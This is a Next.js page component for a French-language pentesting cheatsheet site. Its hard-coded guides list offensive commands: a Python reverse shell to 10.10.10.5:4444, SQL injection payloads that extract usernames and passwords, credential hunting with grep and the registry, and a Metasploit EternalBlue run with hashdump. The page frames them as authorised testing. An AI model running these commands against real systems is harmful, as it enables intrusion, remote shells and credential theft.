import { createClient } from '@supabase/supabase-js';
import { notFound } from 'next/navigation';
import { ArrowLeft, Terminal, BookOpen } from 'lucide-react';
import Link from 'next/link';
import CommandDisplay from '@/components/CommandDisplay';

export const dynamic = 'force-dynamic';

interface CheatsheetPageProps {
    params: {
        id: string;
    };
}

async function getCheatsheetById(id: string) {
    const supabase = createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.SUPABASE_SERVICE_ROLE_KEY!
    );

    const { data, error } = await supabase
        .from('cheatsheets')
        .select('*')
        .eq('id', id)
        .single();

    if (error || !data) return null;
    return data;
}

// Generate detailed explanation for each category
function generateDetailedExplanation(category: string, toolName: string, commands: any[]): string {
    const categoryExplanations: Record<string, string> = {
        'Nmap': `Nmap (Network Mapper) est l'outil de reconnaissance réseau le plus populaire en cybersécurité. Il permet de découvrir des hôtes actifs, identifier les ports ouverts, détecter les services et leurs versions, et même identifier le système d'exploitation cible. C'est la première étape essentielle de tout test de pénétration.`,
        'Linux': `Les commandes Linux sont au cœur du pentesting. La maîtrise de l'énumération système, de l'escalade de privilèges et de la post-exploitation sous Linux est cruciale. Ces commandes permettent de comprendre l'environnement, identifier les failles de configuration, et progresser dans le système compromis.`,
        'Windows': `L'exploitation Windows nécessite une compréhension approfondie de PowerShell, CMD, et Active Directory. Ces commandes permettent l'énumération de domaine, l'extraction de credentials, et le mouvement latéral dans les réseaux d'entreprise. Windows étant omniprésent en entreprise, ces compétences sont essentielles.`,
        'Python': `Python est le langage de prédilection pour l'automatisation en pentesting. Il permet de créer des scripts personnalisés, des serveurs HTTP pour l'exfiltration, des reverse shells, et des outils d'exploitation sur mesure. Sa simplicité et sa puissance en font un outil indispensable.`,
        'Metasploit': `Metasploit Framework est la plateforme d'exploitation la plus complète. Elle automatise l'exploitation de vulnérabilités, génère des payloads personnalisés, et offre Meterpreter pour la post-exploitation. C'est l'outil professionnel par excellence pour les pentesters.`,
        'SQL': `Les injections SQL restent parmi les vulnérabilités web les plus critiques. Elles permettent de contourner l'authentification, extraire des bases de données entières, et parfois obtenir l'exécution de code sur le serveur. La maîtrise de ces techniques est fondamentale pour le test d'applications web.`,
        'Netcat': `Netcat est le "couteau suisse" du réseau. Cet outil simple mais puissant permet d'établir des connexions TCP/UDP, créer des reverse shells, transférer des fichiers, et même scanner des ports. Sa polyvalence en fait un incontournable de tout pentester.`,
        'Wireshark': `Wireshark est l'analyseur de protocoles réseau de référence. Il capture et analyse le trafic réseau en temps réel, permettant d'identifier des credentials en clair, analyser des protocoles, et comprendre les communications réseau. Essentiel pour le forensics et l'analyse de sécurité.`,
        'WiFi': `Le hacking WiFi avec la suite Aircrack-ng permet d'auditer la sécurité des réseaux sans fil. De la capture de handshakes WPA au cracking de mots de passe, ces outils sont essentiels pour tester la robustesse des réseaux WiFi d'entreprise.`,
        'Burp Suite': `Burp Suite est le proxy d'interception professionnel pour le test de sécurité web. Il permet d'intercepter et modifier les requêtes HTTP, scanner automatiquement les vulnérabilités, et fuzzer les applications. C'est l'outil standard de l'industrie pour le pentesting web.`,
        'Web Security': `La sécurité web couvre un large spectre de vulnérabilités : XSS, CSRF, injections, authentification faible, etc. Ces techniques permettent de compromettre des applications web, voler des sessions, et exécuter du code côté client ou serveur.`,
        'Exploits': `Les exploits sont des programmes qui tirent parti de vulnérabilités spécifiques (CVE) pour compromettre des systèmes. La compréhension des exploits publics et le développement d'exploits personnalisés sont des compétences avancées en pentesting.`,
    };

    return categoryExplanations[category] || `Cette catégorie regroupe des techniques et outils essentiels pour la sécurité offensive. Maîtriser ces commandes vous permettra d'effectuer des tests de pénétration professionnels et d'identifier les failles de sécurité.`;
}

// Generate usage context
function generateUsageContext(category: string): { when: string; why: string; how: string } {
    const contexts: Record<string, { when: string; why: string; how: string }> = {
        'Nmap': {
            when: 'Au début de chaque engagement de pentesting, pendant la phase de reconnaissance.',
            why: 'Pour cartographier le réseau cible, identifier les services exposés, et trouver des vecteurs d\'attaque potentiels.',
            how: 'Commencez par un scan ping pour découvrir les hôtes, puis scannez les ports et services. Utilisez les scripts NSE pour détecter les vulnérabilités.'
        },
        'Linux': {
            when: 'Après avoir obtenu un accès initial à un système Linux, pendant la post-exploitation.',
            why: 'Pour énumérer le système, identifier les vecteurs d\'escalade de privilèges, et maintenir l\'accès.',
            how: 'Commencez par l\'énumération basique (uname, id, sudo -l), puis cherchez les binaires SUID et les configurations faibles.'
        },
        'Windows': {
            when: 'Lors de la compromission d\'un système Windows ou d\'un environnement Active Directory.',
            why: 'Pour énumérer les utilisateurs, groupes, privilèges, et progresser dans le réseau d\'entreprise.',
            how: 'Utilisez PowerShell et CMD pour l\'énumération, puis BloodHound pour cartographier Active Directory.'
        },
        'SQL': {
            when: 'Lors du test d\'une application web avec des champs de saisie utilisateur.',
            why: 'Pour identifier et exploiter les injections SQL qui permettent d\'accéder à la base de données.',
            how: 'Testez d\'abord avec des payloads simples (\' OR 1=1--), puis utilisez UNION pour extraire des données.'
        },
        'Metasploit': {
            when: 'Après avoir identifié une vulnérabilité exploitable via Nmap ou un scanner de vulnérabilités.',
            why: 'Pour automatiser l\'exploitation et obtenir un shell Meterpreter pour la post-exploitation.',
            how: 'Recherchez le module approprié, configurez RHOSTS et LHOST, puis lancez l\'exploit.'
        },
    };

    return contexts[category] || {
        when: 'Pendant les phases appropriées d\'un test de pénétration.',
        why: 'Pour identifier et exploiter les vulnérabilités de sécurité.',
        how: 'Suivez une méthodologie structurée et documentez toutes vos actions.'
    };
}

// Generate technical guide with examples
function generateTechnicalGuide(category: string): { title: string; steps: { step: string; command: string; explanation: string }[] } {
    const guides: Record<string, { title: string; steps: { step: string; command: string; explanation: string }[] }> = {
        'Nmap': {
            title: 'Guide Technique Nmap',
            steps: [
                {
                    step: '1. Découverte d\'hôtes',
                    command: 'nmap -sn 192.168.1.0/24',
                    explanation: 'Scan ping pour identifier les hôtes actifs sur le réseau. L\'option -sn désactive le scan de ports.'
                },
                {
                    step: '2. Scan de ports basique',
                    command: 'nmap -p- 192.168.1.10',
                    explanation: 'Scanne tous les 65535 ports TCP. Utilisez -T4 pour accélérer le scan.'
                },
                {
                    step: '3. Détection de services',
                    command: 'nmap -sV -sC 192.168.1.10',
                    explanation: '-sV détecte les versions des services, -sC exécute les scripts NSE par défaut pour identifier les vulnérabilités.'
                },
                {
                    step: '4. Scan agressif complet',
                    command: 'nmap -A -T4 192.168.1.10',
                    explanation: 'Combine détection OS, version, scripts et traceroute. Très informatif mais facilement détectable.'
                },
                {
                    step: '5. Scan de vulnérabilités',
                    command: 'nmap --script vuln 192.168.1.10',
                    explanation: 'Exécute tous les scripts de détection de vulnérabilités. Identifie EternalBlue, Shellshock, etc.'
                }
            ]
        },
        'Linux': {
            title: 'Guide Technique Linux Post-Exploitation',
            steps: [
                {
                    step: '1. Énumération système',
                    command: 'uname -a && cat /etc/os-release',
                    explanation: 'Identifie le kernel et la distribution. Crucial pour choisir les exploits d\'escalade de privilèges.'
                },
                {
                    step: '2. Vérifier les privilèges sudo',
                    command: 'sudo -l',
                    explanation: 'Liste les commandes exécutables avec sudo. Cherchez des binaires exploitables sur GTFOBins.'
                },
                {
                    step: '3. Recherche de binaires SUID',
                    command: 'find / -perm -4000 -type f 2>/dev/null',
                    explanation: 'Trouve tous les binaires SUID. Les binaires mal configurés permettent l\'escalade vers root.'
                },
                {
                    step: '4. Énumération réseau',
                    command: 'netstat -tulpn && ss -tulpn',
                    explanation: 'Affiche les ports en écoute et les connexions actives. Identifie les services internes exploitables.'
                },
                {
                    step: '5. Recherche de credentials',
                    command: 'grep -r "password" /home/ 2>/dev/null',
                    explanation: 'Cherche des mots de passe dans les fichiers utilisateur. Vérifiez aussi .bash_history et .ssh/'
                }
            ]
        },
        'Windows': {
            title: 'Guide Technique Windows Post-Exploitation',
            steps: [
                {
                    step: '1. Énumération système',
                    command: 'systeminfo',
                    explanation: 'Affiche OS, patches, architecture. Comparez avec les CVE pour trouver des exploits d\'escalade.'
                },
                {
                    step: '2. Énumération utilisateurs',
                    command: 'net user && net localgroup administrators',
                    explanation: 'Liste les utilisateurs et administrateurs locaux. Identifie les comptes à cibler.'
                },
                {
                    step: '3. Vérifier les privilèges',
                    command: 'whoami /priv && whoami /groups',
                    explanation: 'Affiche les privilèges et groupes. Cherchez SeImpersonatePrivilege pour Juicy Potato.'
                },
                {
                    step: '4. Énumération Active Directory',
                    command: 'net user /domain && net group "Domain Admins" /domain',
                    explanation: 'Liste les utilisateurs et admins du domaine. Première étape pour le mouvement latéral.'
                },
                {
                    step: '5. Recherche de credentials',
                    command: 'cmdkey /list && reg query HKLM /f password /t REG_SZ /s',
                    explanation: 'Cherche les credentials stockés et les mots de passe dans le registre.'
                }
            ]
        },
        'SQL': {
            title: 'Guide Technique Injection SQL',
            steps: [
                {
                    step: '1. Test d\'injection basique',
                    command: '\' OR 1=1--',
                    explanation: 'Payload de base pour tester si l\'application est vulnérable. Si ça fonctionne, l\'authentification est contournée.'
                },
                {
                    step: '2. Déterminer le nombre de colonnes',
                    command: '\' ORDER BY 1-- (incrémenter jusqu\'à erreur)',
                    explanation: 'Trouve le nombre de colonnes dans la requête. Nécessaire pour l\'injection UNION.'
                },
                {
                    step: '3. Injection UNION',
                    command: '\' UNION SELECT NULL,NULL,NULL--',
                    explanation: 'Remplacez les NULL par les données à extraire. Ajustez le nombre selon l\'étape 2.'
                },
                {
                    step: '4. Extraction de bases de données',
                    command: '\' UNION SELECT schema_name FROM information_schema.schemata--',
                    explanation: 'Liste toutes les bases de données. Ciblez ensuite les tables intéressantes.'
                },
                {
                    step: '5. Extraction de données',
                    command: '\' UNION SELECT username,password FROM users--',
                    explanation: 'Extrait les credentials. Les mots de passe sont souvent hashés (MD5, bcrypt).'
                }
            ]
        },
        'Python': {
            title: 'Guide Technique Python pour Pentesting',
            steps: [
                {
                    step: '1. Serveur HTTP simple',
                    command: 'python3 -m http.server 8000',
                    explanation: 'Héberge un serveur web pour servir des payloads ou exfiltrer des données.'
                },
                {
                    step: '2. Reverse shell Python',
                    command: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
                    explanation: 'Établit un reverse shell vers l\'attaquant. Remplacez l\'IP et le port.'
                },
                {
                    step: '3. Scanner de ports simple',
                    command: 'python -c "import socket;[print(p,\'open\') for p in range(1,1024) if socket.socket().connect_ex((\'target\',p))==0]"',
                    explanation: 'Scanne les 1024 premiers ports. Utile quand Nmap n\'est pas disponible.'
                },
                {
                    step: '4. Encoder en base64',
                    command: 'python -c "import base64;print(base64.b64encode(b\'payload\').decode())"',
                    explanation: 'Encode un payload pour contourner les filtres. Décodez côté cible.'
                },
                {
                    step: '5. Générer un hash',
                    command: 'python -c "import hashlib;print(hashlib.md5(b\'password\').hexdigest())"',
                    explanation: 'Génère un hash MD5. Utile pour comparer avec des hashes extraits.'
                }
            ]
        },
        'Metasploit': {
            title: 'Guide Technique Metasploit Framework',
            steps: [
                {
                    step: '1. Lancer Metasploit',
                    command: 'msfconsole',
                    explanation: 'Démarre l\'interface console de Metasploit. Utilisez -q pour un démarrage silencieux.'
                },
                {
                    step: '2. Rechercher un exploit',
                    command: 'search eternalblue',
                    explanation: 'Recherche des modules par mot-clé. Utilisez search type:exploit platform:windows pour filtrer.'
                },
                {
                    step: '3. Configurer l\'exploit',
                    command: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.10\nset LHOST 192.168.1.5',
                    explanation: 'Sélectionne le module et configure la cible (RHOSTS) et l\'IP locale (LHOST).'
                },
                {
                    step: '4. Lancer l\'exploitation',
                    command: 'exploit',
                    explanation: 'Lance l\'attaque. Si réussi, ouvre une session Meterpreter pour la post-exploitation.'
                },
                {
                    step: '5. Post-exploitation Meterpreter',
                    command: 'getuid\nhashdump\nscreenshot',
                    explanation: 'Vérifie les privilèges, extrait les hashes Windows, et prend une capture d\'écran.'
                }
            ]
        }
    };

    return guides[category] || {
        title: 'Guide Technique',
        steps: [
            {
                step: '1. Préparation',
                command: 'Configurez votre environnement de test',
                explanation: 'Assurez-vous d\'avoir les autorisations nécessaires avant de commencer.'
            }
        ]
    };
}

export default async function CheatsheetPage({ params }: CheatsheetPageProps) {
    const cheatsheet = await getCheatsheetById(params.id);

    if (!cheatsheet) {
        notFound();
    }

    const explanation = generateDetailedExplanation(
        cheatsheet.category,
        cheatsheet.tool_name,
        cheatsheet.command_data || []
    );

    const context = generateUsageContext(cheatsheet.category);
    const technicalGuide = generateTechnicalGuide(cheatsheet.category);

    const categoryColors: Record<string, string> = {
        'Nmap': 'from-blue-600 to-cyan-600',
        'Linux': 'from-green-600 to-emerald-600',
        'Windows': 'from-blue-500 to-indigo-600',
        'Python': 'from-yellow-500 to-orange-500',
        'Metasploit': 'from-red-600 to-pink-600',
        'SQL': 'from-purple-600 to-violet-600',
        'Web Security': 'from-cyan-500 to-blue-500',
        'Exploits': 'from-red-500 to-orange-600',
    };

    const gradientColor = categoryColors[cheatsheet.category] || 'from-gray-600 to-gray-800';

    return (
        <main className="min-h-screen bg-black pt-20 px-4 pb-20">
            <div className="max-w-5xl mx-auto">
                {/* Breadcrumb Navigation */}
                <nav aria-label="Fil d'Ariane" className="mb-6">
                    <ol className="flex items-center gap-2 text-xs text-gray-500 flex-wrap">
                        <li><a href="/" className="hover:text-cyan-400 transition-colors">🏠 Accestique</a></li>
                        <li>/</li>
                        <li><a href="/cheatsheets" className="hover:text-cyan-400 transition-colors">📋 Cheatsheets</a></li>
                        <li>/</li>
                        <li className="text-cyan-400">🎯 {cheatsheet.category}</li>
                    </ol>
                </nav>

                {/* Back Button */}
                <div className="mb-8">
                    <Link
                        href="/cheatsheets"
                        className="inline-flex items-center gap-2 text-cyan-400 hover:text-cyan-300 px-4 py-2 rounded border border-cyan-500/30 hover:border-cyan-400/60 bg-black/30 transition-all text-sm font-mono"
                    >
                        ← Retour aux Cheatsheets
                    </Link>
                </div>

                {/* Header */}
                <div className="bg-black/50 border border-cyan-500/30 rounded-lg p-6 md:p-8 mb-8">
                    <div className="flex items-start gap-3 mb-3">
                        <span className="text-3xl">🔧</span>
                        <h1 className="text-3xl md:text-4xl font-bold text-white font-mono">
                            {cheatsheet.tool_name}
                        </h1>
                    </div>
                    <p className="text-gray-400 text-xs font-mono mb-4">
                        {cheatsheet.category} • {new Date().toLocaleDateString('fr-FR', { year: 'numeric', month: 'long' })}
                    </p>
                    <p className="text-gray-300 text-sm leading-relaxed">
                        {explanation}
                    </p>
                </div>

                {/* Context Cards */}
                <div className="grid md:grid-cols-3 gap-4 mb-10">
                    {/* Quand l'utiliser */}
                    <div className="bg-black/50 border border-green-500/40 rounded-lg p-5">
                        <div className="flex items-start gap-3 mb-3">
                            <span className="text-3xl">⏰</span>
                            <h3 className="text-green-400 font-bold uppercase text-xs tracking-wide">Quand l'utiliser</h3>
                        </div>
                        <p className="text-gray-300 text-sm leading-relaxed">{context.when}</p>
                    </div>

                    {/* Pourquoi */}
                    <div className="bg-black/50 border border-cyan-500/40 rounded-lg p-5">
                        <div className="flex items-start gap-3 mb-3">
                            <span className="text-3xl">🎯</span>
                            <h3 className="text-cyan-400 font-bold uppercase text-xs tracking-wide">Pourquoi</h3>
                        </div>
                        <p className="text-gray-300 text-sm leading-relaxed">{context.why}</p>
                    </div>

                    {/* Comment */}
                    <div className="bg-black/50 border border-yellow-500/40 rounded-lg p-5">
                        <div className="flex items-start gap-3 mb-3">
                            <span className="text-3xl">⚡</span>
                            <h3 className="text-yellow-400 font-bold uppercase text-xs tracking-wide">Comment</h3>
                        </div>
                        <p className="text-gray-300 text-sm leading-relaxed">{context.how}</p>
                    </div>
                </div>

                {/* Technical Guide */}
                <div className="bg-black/50 border border-indigo-500/30 rounded-lg p-6 md:p-8 mb-8">
                    <h2 className="text-2xl md:text-3xl font-bold text-indigo-400 mb-1 flex items-center gap-2">
                        <span>📖</span>
                        {technicalGuide.title}
                    </h2>
                    <p className="text-gray-400 text-xs mb-6">
                        Suivez ce guide étape par étape pour maîtriser l'utilisation de cet outil en situation réelle.
                    </p>

                    <div className="space-y-4">
                        {technicalGuide.steps.map((stepData, index) => (
                            <div key={index} className="bg-black/50 border border-indigo-500/20 rounded-lg p-4">
                                <div className="flex items-start gap-3 mb-3">
                                    <span className="inline-flex items-center justify-center w-6 h-6 rounded bg-indigo-600/40 text-indigo-300 text-xs font-bold">
                                        {index + 1}
                                    </span>
                                    <h3 className="text-indigo-300 font-bold text-sm">{stepData.step}</h3>
                                </div>
                                <div className="bg-black/40 rounded p-3 mb-2 border border-gray-800/50 overflow-x-auto">
                                    <pre>
                                        <code className="text-neon-green font-mono text-xs whitespace-pre-wrap break-words">
                                            {stepData.command}
                                        </code>
                                    </pre>
                                </div>
                                <p className="text-gray-400 text-xs leading-relaxed">
                                    {stepData.explanation}
                                </p>
                            </div>
                        ))}
                    </div>
                </div>

                {/* Commands Section */}
                <div className="bg-black/50 border border-cyan-500/30 rounded-lg p-6 md:p-8 mb-8">
                    <h2 className="text-2xl md:text-3xl font-bold text-cyan-400 mb-1 flex items-center gap-2">
                        <BookOpen className="w-6 h-6" />
                        Commandes et Techniques
                    </h2>
                    <p className="text-gray-400 text-xs mb-6">
                        Les commandes essentielles pour appliquer cette technique en situation réelle.
                    </p>

                    <CommandDisplay commands={cheatsheet.command_data || []} />
                </div>

                {/* Best Practices */}
                <div className="bg-black/50 border border-yellow-500/30 rounded-lg p-6 md:p-8 mb-12">
                    <h3 className="text-2xl md:text-3xl font-bold text-yellow-400 mb-4 flex items-center gap-2">
                        <span>⚠️</span>
                        Bonnes Pratiques
                    </h3>
                    <ul className="space-y-3">
                        <li className="flex items-start gap-3 text-gray-300 text-sm">
                            <span className="text-yellow-400 font-bold">✓</span>
                            <span>Toujours obtenir une <strong className="text-cyan-400">autorisation écrite</strong> avant d'utiliser ces techniques</span>
                        </li>
                        <li className="flex items-start gap-3 text-gray-300 text-sm">
                            <span className="text-yellow-400 font-bold">✓</span>
                            <span>Tester dans un <strong className="text-cyan-400">environnement de lab</strong> avant la production</span>
                        </li>
                        <li className="flex items-start gap-3 text-gray-300 text-sm">
                            <span className="text-yellow-400 font-bold">✓</span>
                            <span><strong className="text-cyan-400">Documenter</strong> toutes les actions pour le rapport final</span>
                        </li>
                        <li className="flex items-start gap-3 text-gray-300 text-sm">
                            <span className="text-yellow-400 font-bold">✓</span>
                            <span>Respecter le <strong className="text-cyan-400">scope</strong> défini dans le contrat d'engagement</span>
                        </li>
                    </ul>
                </div>

                {/* Navigation Footer */}
                <div className="flex flex-col sm:flex-row justify-between items-center gap-4 mt-12">
                    <Link
                        href="/cheatsheets"
                        className="w-full sm:w-auto px-6 py-3 bg-gradient-to-r from-gray-700/50 to-gray-800/50 border-2 border-gray-600/60 hover:border-gray-500 hover:bg-gradient-to-r hover:from-gray-700/70 hover:to-gray-800/70 text-white rounded-xl transition-all text-center font-mono text-sm flex items-center justify-center gap-2 group"
                    >
                        <span className="group-hover:-translate-x-1 transition-transform">←</span>
                        Tous les cheatsheets
                    </Link>
                    <Link
                        href="/academy"
                        className="w-full sm:w-auto px-6 py-3 bg-gradient-to-r from-cyan-600/90 to-blue-600/90 hover:from-cyan-500 hover:to-blue-500 text-white font-bold rounded-xl transition-all text-center font-mono text-sm shadow-lg shadow-cyan-500/30 flex items-center justify-center gap-2 group"
                    >
                        Voir les Tutoriels
                        <span className="group-hover:translate-x-1 transition-transform">→</span>
                    </Link>
                </div>
            </div>
        </main>
    );
}
